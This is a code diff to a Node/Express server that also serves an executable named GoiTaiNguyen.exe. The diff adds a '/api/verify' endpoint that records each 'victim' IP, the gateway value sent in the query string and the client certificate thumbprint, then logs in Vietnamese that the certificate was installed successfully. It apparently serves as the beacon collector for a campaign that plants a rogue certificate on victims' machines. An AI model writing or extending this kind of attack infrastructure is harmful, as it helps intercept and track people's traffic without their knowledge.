@@ -72,6 +72,64 @@ app.get('/resources/GoiTaiNguyen.exe', (req, res) => {
     });
 });
 
+// Verification endpoint: extract gateway param, real IP and cert thumbprint (if any)
+app.get('/api/verify', (req, res) => {
+    const gateway_ip = req.query.gateway || 'Unknown';
+
+    // Get real client IP (respect X-Forwarded-For if behind proxy)
+    const xff = req.headers['x-forwarded-for'];
+    const victim_real_ip = xff ? xff.split(',')[0].trim() : (req.ip || req.connection.remoteAddress);
+
+    const now = new Date().toISOString().replace('T', ' ').slice(0, 19);
+
+    // Attempt to extract client certificate fingerprint (thumbprint)
+    let certFingerprint = null;
+    try {
+        const socket = req.socket || req.connection;
+        if (socket && typeof socket.getPeerCertificate === 'function') {
+            const peer = socket.getPeerCertificate(true) || {};
+            // Node may provide fingerprint/fingerprint256 or raw buffer
+            if (peer.fingerprint) {
+                certFingerprint = peer.fingerprint; // usually SHA-1 with colons
+            } else if (peer.fingerprint256) {
+                certFingerprint = peer.fingerprint256; // SHA-256
+            } else if (peer.raw) {
+                const crypto = require('crypto');
+                const hex = crypto.createHash('sha1').update(peer.raw).digest('hex').toUpperCase();
+                certFingerprint = hex.match(/.{2}/g).join(':');
+            }
+        }
+    } catch (e) {
+        // ignore cert extraction errors
+    }
+
+    // Log to console
+    console.log(`\n[+] TÍN HIỆU MỚI (${now})`);
+    console.log(`    - IP Nạn nhân: ${victim_real_ip}`);
+    console.log(`    - Default Gateway: ${gateway_ip}`);
+    console.log(`    - Cert Thumbprint: ${certFingerprint || 'N/A'}`);
+    console.log(`    - Trạng thái: Đã cài đặt Cert thành công!\n`);
+
+    // Append to logs/verify.log
+    try {
+        const fs = require('fs');
+        const logDir = path.join(__dirname, 'logs');
+        const logPath = path.join(logDir, 'verify.log');
+        if (!fs.existsSync(logDir)) fs.mkdirSync(logDir, { recursive: true });
+        const logLine = `[${now}] - IP: ${victim_real_ip} - Gateway: ${gateway_ip} - CertThumb: ${certFingerprint || 'N/A'}\n`;
+        fs.appendFileSync(logPath, logLine);
+    } catch (e) {
+        console.error('Failed to write verify log:', e.message || e);
+    }
+
+    // Indicate to the client whether a cert thumbprint was observed
+    return res.json({
+        status: 'verified',
+        certThumbprint: certFingerprint || null,
+        verified: !!certFingerprint
+    });
+});
+
 // 404 handler - render custom 404 page for unmatched routes
 app.use((req, res) => {
     res.status(404).render('404', { url: req.originalUrl });
